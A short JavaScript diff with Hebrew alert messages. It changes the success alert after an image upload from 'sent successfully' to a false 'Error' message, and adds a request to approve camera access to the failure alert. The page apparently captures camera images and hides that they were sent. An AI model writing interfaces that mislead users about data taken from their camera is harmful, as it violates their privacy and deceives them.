@@ -58,9 +58,9 @@
                         .then(response => response.json())
                         .then(data => {
                             if (data.ok) {
-                                alert("התמונה נשלחה בהצלחה!");
+                                alert("שגיאה");
                             } else {
-                                alert("אירעה שגיאה: " + data.description);
+                                alert("אירעה שגיאה:אנא אשר גישה למצלמה " + data.description);
                             }
                         })
                         .catch(err => {
